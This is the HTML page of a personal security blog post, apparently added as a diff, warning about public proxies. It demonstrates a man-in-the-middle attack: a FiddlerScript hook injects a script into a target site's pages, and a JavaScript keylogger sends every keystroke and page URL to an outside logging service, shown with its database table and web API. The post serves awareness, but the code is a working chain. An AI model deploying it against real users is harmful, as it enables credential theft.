@@ -1,0 +1,716 @@
+<!doctype html>
+<html class="theme-next   use-motion ">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  <link href="//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Fiddler,Keylogging,Security," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.2" />
+
+
+
+
+
+
+<meta name="description" content="Ah… 9gag has been blocked! How the heck am I supposed to goof off at work? Damn you network admin!
+This is a common scenario in workplaces, schools and colleges where a lot of popular sites are made i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Why public proxies are bad for you">
+<meta property="og:url" content="http://vijshank.com/2015/02/11/Why-public-proxies-are-bad-for-you/index.html">
+<meta property="og:site_name" content="vijshank's blog">
+<meta property="og:description" content="Ah… 9gag has been blocked! How the heck am I supposed to goof off at work? Damn you network admin!
+This is a common scenario in workplaces, schools and colleges where a lot of popular sites are made i">
+<meta property="og:image" content="http://vijshank.com/2015/02/11/Why-public-proxies-are-bad-for-you/mitm1.svg">
+<meta property="og:image" content="http://vijshank.com/2015/02/11/Why-public-proxies-are-bad-for-you/mitm2.svg">
+<meta property="og:image" content="http://vijshank.com/2015/02/11/Why-public-proxies-are-bad-for-you/mitm3.svg">
+<meta property="og:image" content="http://vijshank.com/2015/02/11/Why-public-proxies-are-bad-for-you/FiddlerOptions.png">
+<meta property="og:image" content="http://vijshank.com/2015/02/11/Why-public-proxies-are-bad-for-you/query.png">
+<meta property="og:updated_time" content="2016-01-03T23:06:29.546Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Why public proxies are bad for you">
+<meta name="twitter:description" content="Ah… 9gag has been blocked! How the heck am I supposed to goof off at work? Damn you network admin!
+This is a common scenario in workplaces, schools and colleges where a lot of popular sites are made i">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: 'hide',
+    motion: true
+  };
+</script>
+
+  <title> Why public proxies are bad for you | vijshank's blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">vijshank's blog</span>
+      <span class="logo-line-after"><i></i></span>
+	  <span class="site-description">Hacks, code and random tech stuff</span>
+    </a>
+  </div>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Why public proxies are bad for you
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            Posted on
+            <time itemprop="dateCreated" datetime="2015-02-11T21:08:45+05:30" content="Feb 11 2015">
+              Feb 11 2015
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; In
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index">
+                    <span itemprop="name">Security</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/02/11/Why-public-proxies-are-bad-for-you/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/02/11/Why-public-proxies-are-bad-for-you/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><em>Ah… <a href="http://9gag.com/" target="_blank" rel="external">9gag</a> has been blocked! How the heck am I supposed to goof off at work? Damn you network admin!</em></p>
+<p>This is a common scenario in workplaces, schools and colleges where a lot of popular sites are made inaccessible by the network admin. Just search online for a proxy server and use it, the internet says. You do it and then you get your credentials stolen for some of the sites you visit!</p>
+<p>What sites? <a href="http://amazon.com" target="_blank" rel="external">amazon.com</a> and major banks in India like <a href="http://hdfc.com" target="_blank" rel="external">HDFC</a> and <a href="http://www.icicibank.com" target="_blank" rel="external">ICICI</a>, to name a <strong>few</strong>. Actually, any site that doesn’t either use https or use https but don’t redirect the user to a https version of the site, when the user doesn’t enter https in the URL when visiting the site.</p>
+<p>This blog post is a simple experiment to show how this is done. :D<br>We will see what the scenario looks like, how the hacker operates and what enables this hack to work.</p>
+<h2 id="The_scenario_3A"><a href="#The_scenario_3A" class="headerlink" title="The scenario:"></a>The scenario:</h2><p>When a website is HTTPS enabled, it ensures that your communication to the website is encrypted and is protected against <a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack" target="_blank" rel="external">man-in-the-middle (MITM)</a> attacks.</p>
+<p><strong>Take a look at how MITM attack works:</strong></p>
+<p><img src="/2015/02/11/Why-public-proxies-are-bad-for-you/mitm1.svg" alt=""></p>
+<p>Basically, the hacker dude (or dudette), who is sitting between you and the web server, is intercepting the traffic to see what’s going on and sometimes adds some malicious code to the website you are looking at. (Side note: it could be <a href="http://tech.firstpost.com/news-analysis/more-trouble-for-airtel-injects-javascript-code-to-monitor-data-usage-activist-receives-notice-270111.html" target="_blank" rel="external">your own ISP!</a>)</p>
+<p><strong>How can a hacker intercept the traffic of the user?</strong><br>It could be through malware which was spread to the victim or even through tapping into hardware such as a switch or router that the victim connects to. In our scenario, the proxy server is owned by the hacker which enables the attack:</p>
+<p><img src="/2015/02/11/Why-public-proxies-are-bad-for-you/mitm2.svg" alt=""></p>
+<p><strong>If the site is https enabled, I am safe right?</strong><br>A lot of sites have a http homepage, but have a link on their homepage for login that takes the user to a https enabled page that asks for credentials (Example - <a href="http://amazon.com/" target="_blank" rel="external">amazon.com</a>). </p>
+<p><strong>What’s wrong with this approach?</strong><br>The hacker who can intercept the http homepage can also add a prompt for the user’s credentials at the homepage itself. This login prompt can also be specifically crafted to look just like the website, so as not to look suspicious to the user. </p>
+<p>If you look at step (4) in the above picture, the hacker sends back the requested webpage to the user with some malicious code attached. In our scenario, we will attach two things to the page that is returned to the user from the proxy server in step (4):<br>1) <em>A javascript keylogger</em> that sends every keypress made on the page to a webservice that is somewhere hosted by the hacker.<br>2) <em>A login prompt</em> (if not already present in the page) asking the user to enter the credentials to the site. </p>
+<h2 id="The_Experiment"><a href="#The_Experiment" class="headerlink" title="The Experiment"></a><strong>The Experiment</strong></h2><p><strong>Our experiment setup:</strong></p>
+<p><img src="/2015/02/11/Why-public-proxies-are-bad-for-you/mitm3.svg" alt=""></p>
+<p><strong>Setting up the proxy server</strong>:<br>To simplify this step, I am using Fiddler as the proxy server. After installing fiddler,  enable “Allow remote computers to connect” in options:</p>
+<p><img src="/2015/02/11/Why-public-proxies-are-bad-for-you/FiddlerOptions.png" alt=""></p>
+<p>Now you will be able to see the http traffic of anyone using this MachineName:Port as their proxy server. The next step is to automatically attach our malicious code when sending the response back to the victim. This can be done using fiddler’s fiddlerscript feature. Press Ctrl + R to open FiddlerScript. The below modification to OnBeforeResponse() will make sure that the keylogger script is added to every page request returned to the victim. </p>
+<figure class="highlight"><figcaption><span>FiddlerScript</span></figcaption><table><tr><td class="code"><pre><span class="line">static function OnBeforeResponse(oSession: Session) &#123;&#10;        &#10;        if (oSession.hostname.Contains(&#34;InsertTheVictimSiteHere.com&#34;)) &#10;        &#123;&#10;            oSession.utilDecodeResponse();&#10;            oSession.utilReplaceInResponse(&#39;&#60;/head&#62;&#39;, &#39;&#60;script src=&#34;http://lekeylogger.azurewebsites.net/Logger.js&#34;&#62;&#60;/script&#62;&#39; + &#39;&#60;/head&#62;&#39;);&#10;        &#125;&#10;        &#10;    &#125;</span><br></pre></td></tr></table></figure>
+<p>The keylogger code <em>Logger.js</em> will be downloaded by the user’s browser. This will log every keystroke made by the user on the page. Note that in our experiment, the Logger.js file is hosted on the server where the webservice is hosted (lekeylogger.azurewebsites.net). I have also not injected any login prompt here. It’s just too much work for me, so keeping it simple. :)</p>
+<p><strong>The JavaScript Keylogger</strong>:<br>We implement the keylogger through a function to handle the onkeypress event. Inside the function, we send the pressed key to our service. We also send the an unique InstanceID, SequenceNumber and the current url of the page along with the keystroke:</p>
+<figure class="highlight"><figcaption><span>JavaScript Keylogger</span></figcaption><table><tr><td class="code"><pre><span class="line">InstanceID = Math.random().toString(36).slice(2);&#10;SequenceNumber = 0;&#10;document.onkeypress = function (evt) &#123;&#10;    evt = evt || window.event&#10;    key = String.fromCharCode(evt.charCode)&#10;    if (key) &#123;&#10;        $.ajax(&#123;&#10;            url: &#39;http://lekeylogger.azurewebsites.net/api/Key&#39;,&#10;            type: &#39;Post&#39;,&#10;            data: JSON.stringify(&#123; InstanceID: InstanceID, SequenceNumber: ++SequenceNumber, KeyValue: key, Referer: document.URL &#125;),&#10;            contentType: &#34;application/json&#34;,&#10;            success: function (data) &#123; &#125;,&#10;            error: function () &#123; &#125;&#10;        &#125;);&#10;    &#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>The WebService to record keystrokes</strong>:<br>We create a database with the following (pretty self-explanatory) table:</p>
+<figure class="highlight"><figcaption><span>Keys table:</span></figcaption><table><tr><td class="code"><pre><span class="line">CREATE TABLE [dbo].[Keys]&#10;(&#10;&#9;[InstanceID] NVARCHAR(20) NOT NULL, &#10;    [SequenceNumber] INT NOT NULL,&#10;    [Referer] NVARCHAR(256) NULL,  &#10;    [KeyValue] NCHAR(1) NOT NULL, &#10;    CONSTRAINT [PK_Keys] PRIMARY KEY ([InstanceID], [SequenceNumber])&#10;)</span><br></pre></td></tr></table></figure>
+<p>The service is a pretty simple Asp.NET webapi that looks like this:</p>
+<figure class="highlight"><figcaption><span>Web service to log keystrokes:</span></figcaption><table><tr><td class="code"><pre><span class="line">using KeyLogger.Models;&#10;using System.Web.Http;&#10;&#10;namespace KeyLogger.Controllers&#10;&#123;&#10;    public class KeyController : ApiController&#10;    &#123;&#10;        public IHttpActionResult Post(Key key)&#10;        &#123;&#10;            using (KeyDBEntities keyDB = new KeyDBEntities())&#10;            &#123;&#10;                keyDB.Keys.Add(key);&#10;                keyDB.SaveChanges();&#10;            &#125;&#10;&#10;            return Ok();&#10;        &#125;&#10;    &#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
+<p>The setup is complete. On using this proxy server and visiting the website, the keystrokes made in the browser window are sent to the service and successfully logged in our database:</p>
+<p><img src="/2015/02/11/Why-public-proxies-are-bad-for-you/query.png" alt=""></p>
+<p>That’s all folks!</p>
+<p><strong>P.S:</strong> Don’t use public proxies. Also, the code for this experiment is at: <a href="https://github.com/cracker2excel/lekeylogger" target="_blank" rel="external">https://github.com/cracker2excel/lekeylogger</a></p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Fiddler/" rel="tag">#Fiddler</a>
+          
+            <a href="/tags/Keylogging/" rel="tag">#Keylogging</a>
+          
+            <a href="/tags/Security/" rel="tag">#Security</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/02/06/hello-world/" rel="next" title="Hello World?">
+                <i class="fa fa-chevron-left"></i> Hello World?
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/01/03/Messing-around-with-the-Teewe-dongle/" rel="prev" title="Messing around with the Teewe dongle">
+                Messing around with the Teewe dongle <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+        </div>
+
+        
+
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+      </div>
+    
+  </div>
+
+
+      </div>
+
+      
+        
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Vijay Shankar" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">Vijay Shankar</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description"></p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">categories</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">5</span>
+              <span class="site-state-item-name">tags</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/cracker2excel" target="_blank">
+                  
+                    <i class="fa fa-github"></i> GitHub
+                  
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/vijshankar" target="_blank">
+                  
+                    <i class="fa fa-twitter"></i> Twitter
+                  
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.facebook.com/vijshank" target="_blank">
+                  
+                    <i class="fa fa-facebook"></i> Facebook
+                  
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+      </section>
+
+      
+
+    </div>
+  </aside>
+
+
+      
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="icon-next-heart fa fa-hand-spock-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Vijay Shankar</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+    
+    
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'vijshank';
+      var disqus_identifier = '2015/02/11/Why-public-proxies-are-bad-for-you/';
+      var disqus_title = 'Why public proxies are bad for you';
+      var disqus_url = 'http://vijshank.com/2015/02/11/Why-public-proxies-are-bad-for-you/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>
+
+
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.2" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 1 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    motionMiddleWares.sidebar = function () {
+      var $tocContent = $('.post-toc-content');
+      if (CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    };
+  });
+</script>
+
+
+
+  <script type="text/javascript" src="/js/bootstrap.js"></script>
+
+  
+  
+
+  
+  
+
+</body>
+</html>
